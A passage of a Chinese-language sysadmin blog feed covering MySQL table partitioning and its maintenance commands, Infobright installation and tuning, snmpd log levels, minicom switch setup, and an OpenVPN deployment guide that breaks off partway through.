class="line"> PARTITION `2014-05` VALUES LESS THAN (1401552000) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-06` VALUES LESS THAN (1404144000) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-07` VALUES LESS THAN (1406822400) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-08` VALUES LESS THAN (1409500800) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-09` VALUES LESS THAN MAXVALUE ENGINE = InnoDB) */</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">查看select如何使用分区</div><div class="line">mysql&gt; explain partitions select id,accountid,cid,flag from operation_log where addtime=&quot;1369362524&quot; \G ;</div><div class="line"> *************************** 1\. row ***************************</div><div class="line">   id: 1</div><div class="line">  select_type: SIMPLE</div><div class="line">table: operation_log</div><div class="line">   partitions: 2013-05</div><div class="line"> type: ALL</div><div class="line">possible_keys: NULL</div><div class="line">  key: NULL</div><div class="line">  key_len: NULL</div><div class="line">  ref: NULL</div><div class="line"> rows: 4384356</div><div class="line">Extra: Using where</div><div class="line">1 row in set (0.00 sec)</div><div class="line">``</div><div class="line">分区表元数据统计表：INFORMATION_SCHEMA.PARTITIONS</div><div class="line">查看分区表operation_log的分区信息</div><div class="line">mysql&gt; SELECT partition_name part, partition_expression expr, partition_description descr, table_rows FROM INFORMATION_SCHEMA.partitions WHERE TABLE_SCHEMA = schema() AND TABLE_NAME=&apos;operation_log&apos;;</div><div class="line">+---------+---------+------------+------------+</div><div class="line">| part| expr| descr | table_rows |</div><div class="line">+---------+---------+------------+------------+</div><div class="line">| 2013-05 | addtime | 1370016000 | 5999642 |</div><div class="line">| 2013-06 | addtime | 1372608000 | 4579263 |</div><div class="line">| 2013-07 | addtime | 1375286400 | 3223772 |</div><div class="line">| 2013-08 | addtime | 1377964800 | 1995058 |</div><div class="line">| 2013-09 | addtime | 1380556800 | 2497406 |</div><div class="line">| 2013-10 | addtime | 1383235200 | 4106974 |</div><div class="line">| 2013-11 | addtime | 1385827200 | 6209559 |</div><div class="line">| 2013-12 | addtime | 1388505600 | 6415349 |</div><div class="line">| 2014-01 | addtime | 1391184000 | 3953594 |</div><div class="line">| 2014-02 | addtime | 1393603200 | 0 |</div><div class="line">| 2014-03 | addtime | 1396281600 | 0 |</div><div class="line">| 2014-04 | addtime | 1398873600 | 0 |</div><div class="line">| 2014-05 | addtime | 1401552000 | 0 |</div><div class="line">| 2014-06 | addtime | 1404144000 | 0 |</div><div class="line">| 2014-07 | addtime | 1406822400 | 0 |</div><div class="line">| 2014-08 | addtime | 1409500800 | 0 |</div><div class="line">| 2014-09 | addtime | MAXVALUE | 0 |</div><div class="line">+---------+---------+------------+------------+</div><div class="line">17 rows in set (1.48 sec)</div></pre></td></tr></table></figure>
<h5 id="创建分区操作"><a href="#创建分区操作" class="headerlink" title="创建分区操作"></a>创建分区操作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">RANGE分区：</div><div class="line">mysql&gt; CREATE TABLE `operation_log` (</div><div class="line"> -&gt;  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</div><div class="line"> -&gt; `cid` mediumint(7) unsigned NOT NULL,</div><div class="line"> -&gt; `accountid` mediumint(8) NOT NULL DEFAULT &apos;0&apos; ,</div><div class="line"> -&gt;  `flag` tinyint(1) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line"> -&gt;  `addtime` int(11) unsigned NOT NULL,</div><div class="line"> -&gt; `device` tinyint(1) unsigned NOT NULL DEFAULT &apos;1&apos; ,</div><div class="line"> -&gt;  PRIMARY KEY (`id`,`addtime`),</div><div class="line"> -&gt; KEY `idx_accountid_addtime` (`accountid`,`addtime`),</div><div class="line"> -&gt;  KEY `idx_accountid_flag` (`accountid`,`flag`),</div><div class="line"> -&gt;) ENGINE=InnoDB AUTO_INCREMENT=50951039 DEFAULT CHARSET=utf8 COMMENT=&apos;操作记录&apos;</div><div class="line"> -&gt;/*!50100 PARTITION BY RANGE (addtime)</div><div class="line"> -&gt;(PARTITION `2013-05` VALUES LESS THAN (1370016000) ENGINE = InnoDB,</div><div class="line"> -&gt; PARTITION `2013-06` VALUES LESS THAN (1372608000) ENGINE = InnoDB,</div><div class="line"> -&gt; PARTITION `2013-07` VALUES LESS THAN (1375286400) ENGINE = InnoDB,</div><div class="line"> -&gt; PARTITION `2013-08` VALUES LESS THAN (1377964800) ENGINE = InnoDB,</div><div class="line"> -&gt; PARTITION `2013-09` VALUES LESS THAN MAXVALUE ENGINE = InnoDB) */；</div><div class="line">1 row in set (0.00 sec)</div><div class="line">（ LESS THAN MAXVALUE考虑到可能的最大值）</div><div class="line"></div><div class="line">list分区</div><div class="line">//这种方式失败</div><div class="line">mysql&gt; CREATE TABLE IF NOT EXISTS `list_part` (</div><div class="line"> -&gt;   `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;用户ID&apos;,</div><div class="line"> -&gt;   `province_id` int(2) NOT NULL DEFAULT 0 COMMENT &apos;省&apos;,</div><div class="line"> -&gt;   `name` varchar(50) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;名称&apos;,</div><div class="line"> -&gt;   `sex` int(1) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;0为男，1为女&apos;,</div><div class="line"> -&gt;   PRIMARY KEY (`id`)</div><div class="line"> -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1</div><div class="line"> -&gt; PARTITION BY LIST (province_id) (</div><div class="line"> -&gt; PARTITION p0 VALUES IN (1,2,3,4,5,6,7,8),</div><div class="line"> -&gt; PARTITION p1 VALUES IN (9,10,11,12,16,21),</div><div class="line"> -&gt; PARTITION p2 VALUES IN (13,14,15,19),</div><div class="line"> -&gt; PARTITION p3 VALUES IN (17,18,20,22,23,24)</div><div class="line"> -&gt; );</div><div class="line">ERROR 1503 (HY000): A PRIMARY KEY must include all columns in the table&apos;s partitioning function</div><div class="line"></div><div class="line">//这种方式成功</div><div class="line">mysql&gt; CREATE TABLE IF NOT EXISTS `list_part` (</div><div class="line"> -&gt;   `id` int(11) NOT NULL  COMMENT &apos;用户ID&apos;,</div><div class="line"> -&gt;   `province_id` int(2) NOT NULL DEFAULT 0 COMMENT &apos;省&apos;,</div><div class="line"> -&gt;   `name` varchar(50) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;名称&apos;,</div><div class="line"> -&gt;   `sex` int(1) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;0为男，1为女&apos;</div><div class="line"> -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8</div><div class="line"> -&gt; PARTITION BY LIST (province_id) (</div><div class="line"> -&gt; PARTITION p0 VALUES IN (1,2,3,4,5,6,7,8),</div><div class="line"> -&gt; PARTITION p1 VALUES IN (9,10,11,12,16,21),</div><div class="line"> -&gt; PARTITION p2 VALUES IN (13,14,15,19),</div><div class="line"> -&gt; PARTITION p3 VALUES IN (17,18,20,22,23,24)</div><div class="line"> -&gt; );</div><div class="line">Query OK, 0 rows affected (0.33 sec)</div><div class="line">上面的这个创建list分区时，如果有主銉的话，分区时主键必须在其中，不然就会报错。如果我不用主键，分区就创建成功了，一般情况下，一个张表肯定会有一个主键，这算是一个分区的局限性</div><div class="line"></div><div class="line">hash分区</div><div class="line">mysql&gt; CREATE TABLE IF NOT EXISTS `hash_part` (</div><div class="line"> -&gt;   `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;评论ID&apos;,</div><div class="line"> -&gt;   `comment` varchar(1000) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;评论&apos;,</div><div class="line"> -&gt;   `ip` varchar(25) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;来源IP&apos;,</div><div class="line"> -&gt;   PRIMARY KEY (`id`)</div><div class="line"> -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1</div><div class="line"> -&gt; PARTITION BY HASH(id)</div><div class="line"> -&gt; PARTITIONS 3;</div><div class="line">Query OK, 0 rows affected (0.06 sec)</div><div class="line"></div><div class="line">key分区 </div><div class="line">mysql&gt; CREATE TABLE IF NOT EXISTS `key_part` (</div><div class="line"> -&gt;   `news_id` int(11) NOT NULL  COMMENT &apos;新闻ID&apos;,</div><div class="line"> -&gt;   `content` varchar(1000) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;新闻内容&apos;,</div><div class="line"> -&gt;   `u_id` varchar(25) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;来源IP&apos;,</div><div class="line"> -&gt;   `create_time` DATE NOT NULL DEFAULT &apos;0000-00-00 00:00:00&apos; COMMENT &apos;时间&apos;</div><div class="line"> -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8</div><div class="line"> -&gt; PARTITION BY LINEAR HASH(YEAR(create_time))</div><div class="line"> -&gt; PARTITIONS 3;</div><div class="line">Query OK, 0 rows affected (0.07 sec)</div></pre></td></tr></table></figure>
<h5 id="增加子分区操作"><a href="#增加子分区操作" class="headerlink" title="增加子分区操作"></a><strong>增加子分区操作</strong></h5><pre><code>子分区是分区表中每个分区的再次分割，子分区既可以使用HASH希分区，也可以使用KEY分区。这 也被称为复合分区（composite partitioning）
</code></pre><p>1. 如果一个分区中创建了子分区，其他分区也要有子分区<br>2. 如果创建了了分区，每个分区中的子分区数必有相同<br>3. 同一分区内的子分区，名字不相同，不同分区内的子分区名子可以相同（5.1.50不适用）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"> mysql&gt; CREATE TABLE IF NOT EXISTS `sub_part` (</div><div class="line"> -&gt;   `news_id` int(11) NOT NULL  COMMENT &apos;新闻ID&apos;,</div><div class="line"> -&gt;   `content` varchar(1000) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;新闻内容&apos;,</div><div class="line"> -&gt;   `u_id` int(11) NOT NULL DEFAULT 0s COMMENT &apos;来源IP&apos;,</div><div class="line"> -&gt;   `create_time` DATE NOT NULL DEFAULT &apos;0000-00-00 00:00:00&apos; COMMENT &apos;时间&apos;</div><div class="line"> -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8</div><div class="line"> -&gt; PARTITION BY RANGE(YEAR(create_time))</div><div class="line"> -&gt; SUBPARTITION BY HASH(TO_DAYS(create_time))(</div><div class="line"> -&gt; PARTITION p0 VALUES LESS THAN (1990)(SUBPARTITION s0,SUBPARTITION s1,SUBPARTITION s2),</div><div class="line"> -&gt; PARTITION p1 VALUES LESS THAN (2000)(SUBPARTITION s3,SUBPARTITION s4,SUBPARTITION good),</div><div class="line"> -&gt; PARTITION p2 VALUES LESS THAN MAXVALUE(SUBPARTITION tank0,SUBPARTITION tank1,SUBPARTITION tank3)</div><div class="line"> -&gt; );</div><div class="line">Query OK, 0 rows affected (0.07 sec)</div></pre></td></tr></table></figure>
<h5 id="分区管理"><a href="#分区管理" class="headerlink" title="分区管理"></a><strong>分区管理</strong></h5><p>增加分区操作（针对设置MAXVALUE）<br>range添加分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt;alter table operation_log add  partition(partition `2013-10` values less than (1383235200));  ---&gt;适用于没有设置MAXVALUE的分区添加</div><div class="line">   ERROR 1481 (HY000):MAXVALUE can only be used in last partition definition</div><div class="line">mysql&gt;alter table operation_log REORGANIZE partition `2013-09` into (partition `2013-09` values less than (1380556800),partition `2013-10` values less than (1383235200),partition `2013-11` values less than maxvalue);</div></pre></td></tr></table></figure></p>
<p>list添加分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; alter table list_part add partition(partition p4 values in (25,26,28));</div><div class="line">Query OK, 0 rows affected (0.01 sec)</div><div class="line">Records: 0  Duplicates: 0  Warnings: 0</div></pre></td></tr></table></figure></p>
<p>hash重新分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; alter table list_part add partition(partition p4 values in (25,26,28));</div><div class="line">Query OK, 0 rows affected (0.01 sec)</div><div class="line">Records: 0  Duplicates: 0  Warnings: 0</div></pre></td></tr></table></figure></p>
<p>key重新分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; alter table key_part add partition partitions 4;</div><div class="line">Query OK, 1 row affected (0.06 sec)//有数据也会被重新分配</div><div class="line">Records: 1  Duplicates: 0  Warnings: 0</div></pre></td></tr></table></figure></p>
<p>子分区添加新分区，虽然我没有指定子分区，但是系统会给子分区命名的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; alter table sub1_part add partition(partition p3 values less than MAXVALUE);</div><div class="line">Query OK, 0 rows affected (0.02 sec)</div><div class="line">Records: 0  Duplicates: 0  Warnings: 0</div></pre></td></tr></table></figure></p>
<h5 id="删除分区操作"><a href="#删除分区操作" class="headerlink" title="删除分区操作"></a><strong>删除分区操作</strong></h5><p><code>alter table user drop partition</code>2013-05<code>;</code></p>
<h4 id="分区表其他操作"><a href="#分区表其他操作" class="headerlink" title="分区表其他操作"></a>分区表其他操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">重建分区(官方：与先drop所有记录然后reinsert是一样的效果；用于整理表碎片)</div><div class="line">alter table operation_log rebuild partition `2014-01`;</div><div class="line">重建多个分区</div><div class="line">alter table operation_log rebuild partition `2014-01`,`2014-02`;</div><div class="line">过程如下：</div><div class="line"></div><div class="line">pro</div><div class="line">优化分区（如果删除了一个分区的大量记录或者对一个分区的varchar blob text数据类型的字段做了许多更新，此时可以对分区进行优化以回收未使用的空间和整理分区数据文件）</div><div class="line">alter table operation_log  optimize  partition `2014-01`;</div><div class="line"></div><div class="line">优化的操作相当于check partition,analyze partition 和repair patition</div><div class="line"></div><div class="line">分析分区</div><div class="line">alter table operation_log  analyze partition  `2014-01`;</div><div class="line"></div><div class="line">修复分区</div><div class="line">alter table operation_log repair partition   `2014-01`;</div><div class="line"></div><div class="line">检查分区</div><div class="line">alter table operation_log check  partition   `2014-01`;</div></pre></td></tr></table></figure>
<p><strong>注释：</strong></p>
<ol>
<li>mysqlcheck、myisamchk并不支持分区表，analyze,check,optimize,rebuild,repair,truncate不支持子分区操作</li>
<li>在MySQL5.6中，可以使用清空一个分区数据：alter table operation_log truncate partition <code>2014-01</code>;</li>
<li>清空该分区表所有分区数据：alter table operation_log truncate partition all;</li>
</ol>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="http://blog.51yip.com/mysql/1013.html" target="_blank" rel="external">http://blog.51yip.com/mysql/1013.html</a><br><a href="https://dev.mysql.com/doc/refman/5.6/en/partitioning-maintenance.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.6/en/partitioning-maintenance.html</a><br><a href="http://dev.mysql.com/doc/refman/5.6/en/index.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.6/en/index.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Infobright数据仓库安装及参数优化]]></title>
      <url>/2014/08/19/infobright.html</url>
      <content type="html"><![CDATA[<h4 id="认知Infobright数据仓库"><a href="#认知Infobright数据仓库" class="headerlink" title="认知Infobright数据仓库"></a>认知Infobright数据仓库</h4><ol>
<li>Infobright是开源的DATA Warehouse，可以作为Mysql的存储引擎（BRIGHTHOUSE）使用，select查询与Mysql无区别</li>
<li>适用于基于Mysql架构下的OLAP，区分为ICE（社区版免费）和IEE（企业版商业授权）</li>
<li>千万级的查询性能比MyISAM、InnoDB等快5-60倍，且数据量很大时，查询性能基本在同一个数量级，适合聚合查询（SUM,COUNT，AVG，GROUP BY）</li>
<li>列式存储，无需建索引和分区，高压缩比40:1（官方数字）</li>
<li>ICE和IEE版本的区别和限制<br><a href="https://www.infobright.org/index.php/Learn-More/ICE_IEE_Comparison/" target="_blank" rel="external">https://www.infobright.org/index.php/Learn-More/ICE_IEE_Comparison/</a></li>
</ol>
<h4 id="Infobright基本安装初始化"><a href="#Infobright基本安装初始化" class="headerlink" title="Infobright基本安装初始化"></a>Infobright基本安装初始化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget http://www.infobright.org/downloads/ice/infobright-4.0.7-0-x86_64-ice.rpm</div><div class="line">rpm -ivh infobright-4.0.7-0-x86_64-ice.rpm --prefix=/usr/local/</div></pre></td></tr></table></figure>
<p>A.初始化数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">/usr/local/infobright/scripts/mysql_install_db --datadir=/data/data/ --basedir=/usr/local/infobright-4.0.7-x86_64/ --force</div><div class="line"> 安装之后会生成</div><div class="line">/etc/my-ib.cnf.inactive （主配置文件，下面两个暂不讨论）</div><div class="line"></div><div class="line">/etc/my-ib-master.cnf</div><div class="line">/etc/my-ib-slave.cnf</div><div class="line">/etc/rc.d/init.d/mysqld-ib（启动脚本）</div><div class="line">mv  /etc/my-ib.cnf.inactive /etc/my-ib.cnf</div><div class="line">修改/etc/rc.d/init.d/mysqld-ib /etc/my-ib.cnf  的datadir basedir参数到指定位置</div><div class="line">修改权限chown mysql.mysql /etc/my-ib*  /data/data /ibcache/cachedata</div></pre></td></tr></table></figure></p>
<p>B.修改warehouse引擎配置文件<br>  /data/data/brighthouse.ini<br>C.参数优化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CacheFolder = /ibcache/cachedata/</div><div class="line">ServerMainHeapSize = 28000</div><div class="line">ServerCompressedHeapSize = 4000</div><div class="line">LoaderMainHeapSize = 800</div><div class="line">ControlMessages = 3</div><div class="line">KNFolder = BH_RSI_Repository</div><div class="line">AllowMySQLQueryPath = 0</div></pre></td></tr></table></figure></p>
<p><strong>注释：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">CacheFolder 临时数据目录，用于缓存处理查询的中间结果集，与Datadir相异为宜，可用空间大于20G</div><div class="line">ServerMainHeapSize IB主线程内存，一般设置为物理内存一半；若可能尽量增加</div><div class="line">ServerCompressedHeapSize 服务进程的压缩堆栈空间，存放压缩数据</div><div class="line">LoaderMainHeapSize Bhloader数据导入缓冲区，随目标表的列数增加而调整，loader进程的堆栈空间，一般最大不超过800M</div><div class="line">ControlMessages 控制盒查询日志的信息量级别（1-3之间）</div><div class="line">KNFolder 知识网络目录，默认在datadir目录下</div><div class="line">AllowMySQLQueryPath 是否支持Mysql原生的SQL查询，支持修改为1，否则0</div><div class="line">启动infobright：service mysqld-ib start</div></pre></td></tr></table></figure></p>
<p><strong>ICE版本导入数据方式：
</strong>BRIGHTHOUSE<br>load data infile ‘/data/data.txt’ into table t fields terminated by ‘ ’;</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> infobright </tag>
            
            <tag> 列式数据库 </tag>
            
            <tag> LDAP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[设置snmp输出到message的日志级别]]></title>
      <url>/2014/03/04/snmp-output-log-level.html</url>
      <content type="html"><![CDATA[<p><strong>修改snmp服务的启动脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">vim /etc/rc.d/init.d/snmpd</div><div class="line">将</div><div class="line">OPTIONS=&quot;-LS0-6d -Lf /dev/null -p /var/run/snmpd.pid &quot;</div><div class="line">改成</div><div class="line">OPTIONS=&quot;-Ls3d -Lf /dev/null -p /var/run/snmpd.pid&quot;</div><div class="line">services snmpd restart</div><div class="line"></div><div class="line">**snmpd日志等级的定义:**</div><div class="line">0 或 ! —- LOG_EMERG</div><div class="line">1 或 a —- LOG_ALERT</div><div class="line">2 或 c —- LOG_CRIT</div><div class="line">3 或 e —- LOG_ERR</div><div class="line">4 或 w —- LOG_WARNING</div><div class="line">5 或 n —- LOG_NOTICE</div><div class="line">6 或 i —- LOG_INFO</div><div class="line">7 或 d —- LOG_DEBUG</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> log </tag>
            
            <tag> snmpd </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下使用minicom配置交换机]]></title>
      <url>/2013/12/26/linux-minicom-switch.html</url>
      <content type="html"><![CDATA[<p><strong>前提</strong>：正确将com线连接好<br>1.安装minicom<br>安装epel源，yum -y install minicom</p>
<p>2.配置minicom<br>[root@localhost ~]#  minicom -s<br><a href="http://ow1schdt5.bkt.clouddn.com/old/2013/12/c.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/12/c.png" alt="c"></a></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/old/2013/12/D.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/12/D.png" alt="D"></a></p>
<p>配置好后回车，这里选择Save setup as dfl  然后Exit 即将连接com</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/old/2013/12/e.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/12/e.png" alt="e"></a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> minicom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CentOS6.4下部署OpenVpn服务及使用方法]]></title>
      <url>/2013/12/17/centos-install-openvpn.html</url>
      <content type="html"><![CDATA[<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vpn服务器：eth0:120.3.243.54（外网IP）  eth1：192.168.5.253（私网IP）</div><div class="line">客户端地址：201.1.36.111 </div><div class="line">软件版本：服务端OpenVPN 2.3.2</div></pre></td></tr></table></figure>
<p>实现：访问公司内网及授权vpn地址访问的网段，其他地址均走客户端本地上网</p>
<h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><h5 id="设置YUM源"><a href="#设置YUM源" class="headerlink" title="设置YUM源"></a>设置YUM源</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</div><div class="line">rpm –import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6</div><div class="line">wget http://swupdate.openvpn.org/community/releases/openvpn-2.3.2.tar.gz</div><div class="line">./configure &amp;&amp; make &amp;&amp; make install</div></pre></td></tr></table></figure>
<h5 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">证书生成工具</div><div class="line">yum -y install easy-rsa</div><div class="line">配置OpenVpn：</div><div class="line">mkdir /etc/openvpn/etc -p</div><div class="line">cp -R /usr/share/easy-rsa/ /etc/openvpn/</div><div class="line">源码目录：</div><div class="line">cp sample/sample-config-files/server.conf /etc/openvpn/server.conf</div><div class="line"></div><div class="line">生成证书</div><div class="line">cd /etc/openvpn/easy-rsa/2.0</div><div class="line">. vars</div><div class="line">./clean-all</div><div class="line">./build-ca</div><div class="line"> </div><div class="line">创建vpn server的key</div><div class="line">./build-key-server server</div><div class="line">创建用户秘钥</div><div class="line">./build-key geekwolf</div><div class="line">创建Diffie Hellman，用于增强安全性</div><div class="line">./build-dh</div><div class="line">默认情况所创建的文件会生成在/etc/openvpn/easy-rsa/2.0/keys目录下</div></pre></td></tr></table></figure>
<h5 id="配置OpenVpn"><a href="#配置OpenVpn" class="headerlink" title="配置OpenVpn"></a>配置OpenVpn</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">配置server.conf文件</div><div class="line">方法1:采用秘钥认证</div><div class="line">local 120.3.243.54 </div><div class="line">port 9001</div><div class="line">proto tcp</div><div class="line">dev tun</div><div class="line">ca /etc/openvpn/easy-rsa/2.0/keys/ca.crt</div><div class="line">cert /etc/openvpn/easy-rsa/2.0/keys/server.crt</div><div class="line">key /etc/openvpn/easy-rsa/2.0/keys/server.key # This file should be kept secret</div><div class="line">dh /etc/openvpn/easy-rsa/2.0/keys/dh1024.pem</div><div class="line">server 10.8.0.0 255.255.255.0</div><div class="line">ifconfig-pool-persist ipp.txt</div><div class="line">push “route 192.168.0.0 255.255.0.0”</div><div class="line">push “route 104.172.0.0 255.255.0.0″</div><div class="line">keepalive 10 120</div><div class="line">comp-lzo</div><div class="line">persist-key</div><div class="line">persist-tun</div><div class="line">status openvpn-status.log</div><div class="line">verb 3</div><div class="line"> </div><div class="line">方法2：采用用户密码认证</div><div class="line">A.额外在上面配置文件后面添加[基于PAM身份认证]</div><div class="line">plugin /usr/lib/openvpn/openvpn-auth-pam.so login</div><div class="line">client-cert-not-required</div><div class="line">username-as-common-name</div><div class="line">服务端本地创建用户</div><div class="line">useradd -s /sbin/nologin geekwolf</div><div class="line">passwd geekwolf </div><div class="line">B.额外在上面配置文件后面添加[基于脚本的身份认证]</div><div class="line">auth-user-pass-verify 